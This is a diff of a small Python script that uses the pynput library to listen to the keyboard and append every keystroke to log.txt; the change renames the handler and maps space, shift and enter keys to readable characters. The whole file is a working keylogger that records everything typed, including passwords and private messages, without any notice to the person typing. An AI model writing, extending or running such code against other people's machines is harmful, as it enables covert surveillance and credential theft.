@@ -1,13 +1,22 @@
 from pynput.keyboard import Listener
 
 
-def on_press(key):
+def write_to_file(key):
     letter = str(key)
     letter = letter.replace("'", "")
+
+    if letter == "Key.space":
+        letter = " "
+    if letter == "Key.shift_r":
+        letter = " "
+    if letter == "Key.shift_l":
+        letter = " "
+    if letter == "Key.enter":
+        letter = "\n"
 
     with open("log.txt", "a") as file:
         file.write(letter)
 
 
-with Listener(on_press=on_press) as listener:
+with Listener(on_press=write_to_file) as listener:
     listener.join()
